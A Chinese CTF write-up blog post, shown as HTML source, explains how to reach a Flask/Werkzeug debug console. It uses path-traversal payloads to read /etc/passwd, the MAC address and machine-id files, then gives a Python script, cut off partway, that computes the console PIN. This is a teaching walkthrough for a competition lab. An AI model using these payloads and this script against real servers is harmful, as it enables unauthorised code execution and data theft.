@@ -1,0 +1,354 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一文弄清楚Flask框架下该如何计算PIN码 | Adam8enの8log</title><meta name="author" content="Adam Ben"><meta name="copyright" content="Adam Ben"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="由于目录穿越引起的文件任意读取漏洞导致可以通过计算PIN码的方式来进入控制台">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一文弄清楚Flask框架下该如何计算PIN码">
+<meta property="og:url" content="http://example.com/posts/17f3e1f6f317/index.html">
+<meta property="og:site_name" content="Adam8enの8log">
+<meta property="og:description" content="由于目录穿越引起的文件任意读取漏洞导致可以通过计算PIN码的方式来进入控制台">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg">
+<meta property="article:published_time" content="2023-11-06T09:26:53.000Z">
+<meta property="article:modified_time" content="2023-11-06T09:30:37.000Z">
+<meta property="article:author" content="Adam Ben">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="目录穿越">
+<meta property="article:tag" content="任意读取">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/posts/17f3e1f6f317/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一文弄清楚Flask框架下该如何计算PIN码',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-06 17:30:37'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/transparency.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Adam8enの8log" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-commenting-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Adam8enの8log"><span class="site-name">Adam8enの8log</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-commenting-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">一文弄清楚Flask框架下该如何计算PIN码</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-06T09:26:53.000Z" title="发表于 2023-11-06 17:26:53">2023-11-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-06T09:30:37.000Z" title="更新于 2023-11-06 17:30:37">2023-11-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%8B%A6%E7%97%9B%E4%B9%8B%E8%B7%AF/">CTF苦痛之路</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="一文弄清楚Flask框架下该如何计算PIN码"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>事情的起因是XSCTF决赛的一道题。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140751987.png" alt="image-20231106140751987" /></p>
+<p>进入链接，查看题目。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140832584.png" alt="image-20231106140832584" /></p>
+<p>到这里提示已经很明显了，Flask和debugger（调试模式）。在开发Flask应用中，如果开发人员忘记关闭调试模式，就可能会导致严重的安全隐患。</p>
+<p>随便传递一个错误的参数，就可以看到页面报错的调试页面。点击红圈处，可以直观地观察到源码泄露。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141318438.png" alt="image-20231106141318438" /></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141334777.png" alt="image-20231106141334777" /></p>
+<p>容易分析代码逻辑，这段Python代码将<code>filepath</code>和<code>textfile</code>拼合成一个文件路径并打开，读取该文件路径的内容。其中<code>filepath</code>的值为<code>./uploads/</code>,<code>textfile</code>参数可控。此时我们马上能想到目录穿越漏洞，导致文件任意读取。</p>
+<p>构造payload为<code>?file=../../../../etc/passwd</code>，成功读取到敏感文件<code>/etc/passwd</code>，内含登录系统的用户信息。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106142312396.png" alt="image-20231106142312396" /></p>
+<p>关于<code>/etc/passwd</code>文件更详细的解释可以参考这篇博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/liukaitydn/article/details/83046083">非常详细的/etc/passwd解释_etc/passwd文件的内容和含义-CSDN博客</a>。</p>
+<p>总之经过以上操作，我们成功验证了题目存在文件任意读漏洞，并且有了初步的思路：通过文件任意读读取敏感信息，计算出Flask控制台的PIN码从而获得开发者权限查看flag文件。</p>
+<p>现在开始细聊如何计算PIN码。</p>
+<h2 id="序言"><a class="markdownIt-Anchor" href="#序言"></a> 序言</h2>
+<p>在计算PIN码之前，有一件事必须知道，Flask的PIN码计算仅和werkzeug的debug模块有关。</p>
+<p><font color=red size=5><strong>和Python版本无关！！！</strong></font></p>
+<p>在网络上大多数博客都会告诉你，Flask框架计算PIN码时在Python版本3.6时采用md5加密，在Python版本3.8开始使用sha1加密。但是实际上并没有Python版本为3.7就不能采用sha1加密的说法，仅与werkzeug的版本有关系。而现在绝大多数都是采用高版本的加密，也就是sha1。这一点极其重要，将直接影响我们后续用于计算PIN码时采用的脚本。</p>
+<h3 id="什么是pin码"><a class="markdownIt-Anchor" href="#什么是pin码"></a> 什么是PIN码</h3>
+<p>pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell。</p>
+<h3 id="pin码如何生成"><a class="markdownIt-Anchor" href="#pin码如何生成"></a> PIN码如何生成</h3>
+<p>pin码生成要六要素<br />
+1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测<br />
+2.modname 默认flask.app<br />
+3.appname 默认Flask<br />
+4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量<br />
+5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address<br />
+6.machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了</p>
+<p>了解到这些之后，就可以正式开启算PIN了。</p>
+<h2 id="获取username"><a class="markdownIt-Anchor" href="#获取username"></a> 获取username</h2>
+<p>username参数指的是当前运行这个程序的用户名。这个比较好做，在文件任意读时读取<code> /etc/passwd</code>，猜测用户名就好。比如这道题的最下方出现了<code>xsctf</code>，我们猜测这就是用户名。有一些题目下可能没有特别特殊的用户名，这时候我们就只好猜测用户名为最上方的<code>root</code>。也就是说运行程序的是拥有root权限的管理员。</p>
+<h2 id="获取modname"><a class="markdownIt-Anchor" href="#获取modname"></a> 获取modname</h2>
+<p>一般来说这个值都是默认为<code>flask.app</code>，具体的获取方式每个版本都不同，比如可以通过<code>getattr(app, &quot;module&quot;, t.cast(object, app).class.module)</code>来获取modname。</p>
+<h2 id="获取appname"><a class="markdownIt-Anchor" href="#获取appname"></a> 获取appname</h2>
+<p>一般来说这个值也是默认为<code>Flask</code>，也可以通过<code>getattr(app, 'name', app.class.name)</code>方式获取。</p>
+<h2 id="获取moddir"><a class="markdownIt-Anchor" href="#获取moddir"></a> 获取moddir</h2>
+<p>moddir是flask所在的路径，可以通过<code>getattr(mod, 'file', None)</code>来获得，题目中一般通过查看debug的报错信息获得，如下图。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145402374.png" alt="image-20231106145402374" /></p>
+<p>故本题中的路径为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code>。其实一般都是这个值，最多python版本可能会有差异。</p>
+<h2 id="获取uuidnode"><a class="markdownIt-Anchor" href="#获取uuidnode"></a> 获取uuidnode</h2>
+<p>网卡的mac地址的十进制，可以通过代码uuid.getnode()获得，也可以通过读取/sys/class/net/eth0/address获得，一般获取的是一串十六进制数，将其中的横杠去掉然后转十进制就行。</p>
+<p>本题构造payload为<code>?file=../../../../sys/class/net/eth0/address</code>，结果如下。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145741537.png" alt="image-20231106145741537" /></p>
+<p>例：02:42:ac:1e:00:02 =&gt; 2485378744322<br />
+也可以直接跑print(int(“02:42:ac:1e:00:02”.replace(“:”,“”),16))</p>
+<h2 id="获取machine_id"><a class="markdownIt-Anchor" href="#获取machine_id"></a> 获取machine_id</h2>
+<p>这里尤为重要。</p>
+<p>如果我们能够实现文件任意读，就读取<code>/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>（注意python版本，可以通过上面的报错信息拿到），找到里面的<code>get_machine_id</code>方法，可以最直观的看到本题目计算Flask的machine_id的过程。</p>
+<p>构造payload<code>?file=../../../../usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>，找到该方法。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106150726655.png" alt="image-20231106150726655" /></p>
+<p>重点关注这一段代码。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">    <span class="comment">#依次打开&quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;两个文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span><span class="comment">#注意这个break，只要满足一个就退出循环</span></span><br><span class="line">                <span class="comment">#这里因为&quot;/etc/machine-id&quot;在前，所以优先级更高</span></span><br><span class="line">--snip--</span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment">#这里主要是针对docker机的，通过读取&quot;/proc/self/cgroup&quot;获取经过正则后的值，然后拼接在上一步的字符上</span></span><br><span class="line">        <span class="comment">#不同的题目环境正则条件也许不一样</span></span><br><span class="line">        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span> OSError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>这里很清楚的描述了machine_id码是如何计算的，值得一提的是每个题目的machine_id值计算也许会不一样，所以能读取该环境的<code>get_machine_id</code>函数是最好的方法。</p>
+<p>这里再贴一段别的大佬博客中的解释。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. /etc/machine-id（一般仅非docker机有，截取全文）</span><br><span class="line">2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）</span><br><span class="line">3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）</span><br><span class="line"><span class="comment"># 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope</span></span><br><span class="line"><span class="comment"># 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面</span></span><br><span class="line">文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。</span><br><span class="line">文件3如果存在的话就截取，不存在的话就不用管</span><br><span class="line">最后machine-id=（文件1或文件2）+文件3（存在的话）</span><br></pre></td></tr></table></figure>
+<p>重点是**<code>最后machine-id=（文件1或文件2）+文件3（存在的话）</code>**这段话。machine-id和boot-id只需取一个，machine的优先级更高，然后再与cgroup文件的内容拼接作为最终的machine-id值。值得一提的是cgroup的截取方法并不一定是仅截取最后一个斜杠的内容，根据题目正则条件的不同也有可能只取<code>/docker/</code>后的部分。</p>
+<p>这里的XSCTF题目中machine-id和boot-id都有值，而cgroup文件为空，故只需要取machine-id文件的内容作为machine-id的值。构造payload为<code>?file=../../../../etc/machine-id</code>，读取machine-id为<code>6e1d32ebf38c587c4a41089c0c744c83</code>。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106152333132.png" alt="image-20231106152333132" /></p>
+<p>至此集齐了计算PIN码的所有条件。</p>
+<h2 id="计算pin获得flag"><a class="markdownIt-Anchor" href="#计算pin获得flag"></a> 计算PIN&amp;获得flag</h2>
+<p>下面给出脚本，为了避免werkzeug版本产生的歧义，脚本能够同时给出经过md5和sha1加密计算得到的PIN码。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMd5Pin</span>(<span class="params">probably_public_bits, private_bits</span>):</span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSha1Pin</span>(<span class="params">probably_public_bits, private_bits</span>):</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">macToInt</span>(<span class="params">mac</span>):</span><br><span class="line">    mac = mac.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(mac, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = argparse.ArgumentParser(description = <span class="string">&quot;Calculate Python Flask Pin&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>,required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span 